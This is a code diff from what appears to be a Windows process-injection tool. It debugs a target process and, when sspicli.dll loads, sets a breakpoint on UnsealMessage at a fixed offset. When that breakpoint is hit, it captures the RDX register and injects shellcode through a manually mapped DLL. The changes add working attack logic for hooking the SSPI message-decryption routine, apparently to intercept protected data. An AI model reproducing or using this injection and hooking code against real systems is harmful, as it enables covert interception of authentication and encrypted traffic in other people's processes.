@@ -1,10 +1,12 @@
 #include <Windows.h>
 #include <stdio.h>
-#include <conio.h>
+#include <cstdint>
+//#include <conio.h>
 #include "Mmap.hpp"
 #include "utils.hpp"
 
 #define BUFSIZE MAX_PATH
+PVOID bp_address;
 
 void injector();
 void loader();
@@ -112,16 +114,60 @@ void process_debugevent(DEBUG_EVENT& de, process_info& pi)
             char Path[BUFSIZE];
             GetFinalPathNameByHandleA(de.u.LoadDll.hFile, Path, BUFSIZE, 0);
             if(!find_dll("sspicli.dll", Path)) break;
-            inject_shellcode(pi, mapp_dll(pi), true);
+            
+            // UnsealMessage()
+            bp_address = reinterpret_cast<PVOID>(
+                reinterpret_cast<uintptr_t>(de.u.LoadDll.lpBaseOfDll) + 0x2CD0
+            );
+
+            break_point(de, pi, bp_address, false);
+            INF("break point set at : 0x%llX", (uint64_t)bp_address);
         }
+
         break;
 
+    case EXCEPTION_DEBUG_EVENT:
+
+        {   
+            auto& er =  de.u.Exception.ExceptionRecord;
+            if((er.ExceptionCode != EXCEPTION_BREAKPOINT) || (er.ExceptionAddress != bp_address)) break;
+            INF("breakpoint hit !");
+
+            CONTEXT ctx;
+            ctx.ContextFlags = CONTEXT_ALL;
+
+            auto h_thread = OpenThread(THREAD_ALL_ACCESS, FALSE, de.dwThreadId);
+            if (h_thread == NULL)
+            {
+                ERR("failed to get thread handle");
+                getchar();
+                exit(1);
+            }
+
+            if (GetThreadContext(h_thread, &ctx) == NULL) 
+            {
+                ERR("failed to get thread context");
+                getchar();
+                exit(1);
+            }
+
+            pi.rdx = reinterpret_cast<PVOID>(ctx.Rdx);
+            //INF("closing thread handle ...");
+            CloseHandle(h_thread);
+            //INF("calling injector ...");
+            inject_shellcode(pi, mapp_dll(pi), true);
+            //INF("removing bp ...");
+            break_point(de, pi, bp_address, true);
+        }
+
+        break;
+    
     case EXIT_PROCESS_DEBUG_EVENT:
 
         INF("process terminated, press any key to exit");
         getchar();
         exit(0);
-    
+
     default:
         break;
     }
